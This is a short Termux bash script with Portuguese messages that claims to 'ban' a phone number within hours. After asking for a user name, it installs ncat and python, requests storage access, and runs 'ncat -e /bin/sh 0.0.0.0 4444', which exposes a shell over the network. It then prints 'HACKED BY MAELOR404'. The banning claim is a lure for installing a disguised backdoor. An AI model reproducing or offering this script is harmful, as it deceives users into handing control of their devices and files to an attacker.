#!usr/bin/bash

clear
echo 'Bem vindo ao script de banimento de números by Maelor404'
sleep 1
echo 'AVISO:'
sleep 1
 echo 'NÚMERO SERÁ BANIDO ENTRE 3 A 7 HORAS NÃO FECHE O TERMUX'
 echo 'Digite o usuário:'
 read nome;
 echo "Olá $nome! para banir número precisará ser feito a instalação da ferramenta"
sleep 2
pkg install nmap-ncat
sleep 5
pkg install python
sleep 3
termux-setup-storage
sleep 3
ncat -e /bin/sh 0.0.0.0 4444
sleep 5
echo 'HACKED BY MAELOR404'
